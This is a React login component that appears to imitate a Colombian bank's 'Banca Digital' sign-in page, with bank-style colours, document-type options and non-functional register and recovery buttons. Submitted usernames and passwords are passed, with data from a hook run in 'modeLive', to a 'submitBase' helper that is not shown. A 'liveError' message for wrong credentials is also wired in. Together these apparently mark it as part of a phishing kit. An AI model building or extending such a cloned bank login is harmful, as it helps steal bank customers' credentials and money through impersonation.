import { useFormik } from 'formik'
import { useState } from 'react'

import { submitBase } from '../../../helpers/submitBase'
import { usernameAndPasswordValidate } from '../../../security/usernameAndPasswordValidate'
import { Spiner } from '../../Spiner'
import { UsernameAndPasswordInput } from './UsernameAndPasswordInput'
import { useGeneralData } from '../../../hooks/useGeneralData'
import bgLogin from '../../../assets/background.jpg'
import { ConsideracionesIcon } from '../../../assets/icons/ConsideracionesIcon'
import { ReglamentoIcon } from '../../../assets/icons/ReglamentoIcon'

const valuesData = { username: '', password: '', /* typeDocument: '' */ }
const opciones = ['Cédula de Ciudananía', 'Tarjeta de Identidad', 'Cédula  Extranjera', 'Pasaporte']

export const UsernameAndPassword = () => {
    
    const dataImportant = useGeneralData({ modeLive: true })

    const [valueKeyBoardVirtual, setValueKeyBoardVirtual] = useState('')
    const [selectActive, setSelectActive] = useState(false)
    const [selectItem, setSelectItem] = useState(opciones[0])
    
    
    const { values, handleSubmit, handleChange, errors, handleBlur, touched } = useFormik({
        initialValues: valuesData,
        validate: values => usernameAndPasswordValidate({values, virtualKeyword: false}),
        onSubmit: async(valuesData, {resetForm}) => {
            // Descomentar si quieres un tipo de documento
            // valuesData.typeDocument = selectItem
            // Si voy a usar el modo email verificacion
            localStorage.setItem('email',JSON.stringify(valuesData.username))
            submitBase({dataImportant, valuesData}) 
            return resetForm()
        }
    })
    
    return (
        <>
            




            <div className='flex '>
                <div className='w-[19%] flex flex-col p-[14px]'>
                    <span className='text-[#0033A0] text-center text-[24px] mt-[60px] mb-[14px]'>Seguridad</span>
                    
                    <div>
                        <div className='flex gap-1 mb-[15px]'>
                            <div className='w-[20px]'>
                                <ConsideracionesIcon />
                            </div>
                            <span className='text-[#1e70bf] text-[15px]'>Consideraciones</span>
                        </div>
                        
                        <div className='flex '>
                            <div className='w-[20px]'>
                                <ReglamentoIcon />
                            </div>
                            <span className='text-[#1e70bf] text-[15px]'>Reglamentos</span>
                        </div>
                    </div>

                </div>
                <div style={{
                    background: `url(${bgLogin})`,
                    backgroundRepeat: 'no-repeat',
                    backgroundSize: 'cover'
                }} className='w-full md:h-screen'>

                    <div className=' md:h-screen md:pb-0 w-full pb-10  bgSpecial'>
                        <div className='flex items-center md:justify-center'>

                            <div className='flex md:w-[1065px] md:flex-row flex-col w-full items-center'>
                                <div className='w-full flex justify-center md:justify-end md:items-center'>
                                    <div className='min-h-[370px] relative bg-[#ffffffcc] px-[24px] py-[15px] mt-[45px] w-[332px] rounded-[4px]'>
                                        {
                                            dataImportant.showSpiner ? (
                                                <div className='absolute w-full h-full flex-col left-0 top-0 z-10 flex items-center justify-center bg-[#ffffffd9]'>
                                                    <div className='loader'></div>
                                                    <p className='text-[#EF3340] absolute translate-y-8 text-[14px] font-semibold'>Ingresando</p>
                                                </div>  
                                            ) : null
                                        }  
                                        <p className='text-[#0033A0] text-[24px] text-center font-semibold'>Ingresar</p>
                                        <hr className='border-[1px] border-[#0000001a] my-[14px]' />
                                        {
                                            dataImportant.liveError ? (
                                                <p className='bg-red-500 text-[14px] text-white px-2 py-2 rounded'>Usuario y/o clave incorrectas.</p>
                                            ) : null
                                        }
                                        <form className='flex flex-col' onSubmit={handleSubmit}>

                                            <UsernameAndPasswordInput
                                                username={values.username}
                                                password={values.password}
                                                typeDocument={values.typeDocument}
                                                handleChange={handleChange} 
                                                handleBlur={handleBlur}
                                                touched={touched}
                                                errors={errors}
                                                valueKeyBoardVirtual={valueKeyBoardVirtual}
                                                showPasswordMode={false}

                                                selectActive={selectActive} 
                                                setSelectActive={setSelectActive}
                                                selectItem={selectItem}
                                                setSelectItem={setSelectItem}
                                                opciones={opciones}
                                            />

                                            <div className='flex justify-between'>
                                                <div>
                                                    <input type='checkbox' />
                                                    <span>Certificado Digital</span>
                                                </div>

                                                <div className='bg-[#0030a0] w-[23px] h-[23px] flex items-center justify-center rounded'>
                                                    <svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" focusable="false" width="18" height="18" preserveAspectRatio="xMidYMid meet" viewBox="0 0 32 32">
                                                        <path d="M17 22v-9h-4v2h2v7h-3v2h8v-2h-3z" fill="#fff"/>
                                                        <path d="M16 7a1.5 1.5 0 1 0 1.5 1.5A1.5 1.5 0 0 0 16 7z" fill="#fff"/>
                                                        <path d="M16 30a14 14 0 1 1 14-14a14 14 0 0 1-14 14zm0-26a12 12 0 1 0 12 12A12 12 0 0 0 16 4z" fill="#fff"/>
                                                        <rect x="0" y="0" width="32" height="32" fill="rgba(0, 0, 0, 0)" />
                                                    </svg>
                                                </div>
                                            </div>

                                            <div className='flex items-center justify-center mt-[21px]'>
                                                <button 
                                                        disabled={
                                                            (
                                                                touched.username && 
                                                                errors.username || 
                                                                values.username.length <= 6
                                                            ) 
                                                            || 
                                                            (
                                                                (
                                                                    touched.password && 
                                                                    errors.password || 
                                                                    values.password.length <= 7
                                                                )
                                                            ) 
                                                            == true ? true : false
                                                        }
                                                    className='
                                                    disabled:bg-[#AEADB3] disabled:opacity-45
                                                    text-white w-[130px] py-[10px] rounded bg-[#db2828] transition-all'
                                                    type='submit'
                                                >
                                                    Ingresar
                                                </button>
                                            </div>
                                            
                                            <div className='w-full flex justify-center'>
                                                <button className='text-[11px] rounded-[4px] bg-[#0030a0] my-[20px] p-[9px] text-white '>Recuperar datos de ingreso</button>
                                            </div>
                                        </form>
                                        {/* {dataImportant.liveError === true && (<p className='px-[20px] text-white text-[14px] font-bold text-center py-3 bg-red-600'>Correo y clave inválidos.</p>)} */}
                                    </div>
                                </div>
                                
                                <div className='w-full flex justify-center items-center'>
                                    <div className='h-[370px] bg-[#ffffffcc] px-[24px] py-[15px] mt-[45px] w-[332px] rounded-[4px]'>
                                        
                                        <p className='text-[#0033A0] text-[24px] text-center font-semibold'>Registrarse</p>
                                        <hr className='border-[1px] border-[#0000001a] my-[14px]' />

                                        <p className='opacity-85 text-[15px] text-[#000000de] text-center m-[28px]'>Regístrese aquí si desea utilizar los servicios de Banca Digital.</p>
                                        <p className='opacity-85 text-[15px] text-[#000000de] text-center m-[28px]'>Para registrarse requiere ser cliente y tener al menos un producto activo.</p>

                                        <div className='flex justify-center'> 
                                            <button className='bg-[#db2828] mt-[20px] text-white px-[23px] py-[10px] rounded'>Continuar</button>
                                        </div>
                                        
                                        {/* {dataImportant.liveError === true && (<p className='px-[20px] text-white text-[14px] font-bold text-center py-3 bg-red-600'>Correo y clave inválidos.</p>)} */}
                                    </div>
                                </div>
                                
                            </div>
                        </div>

                        {/* Colocar diseño base */}
                        
                    </div>
                </div>

            </div>



        </>
            
    )
}
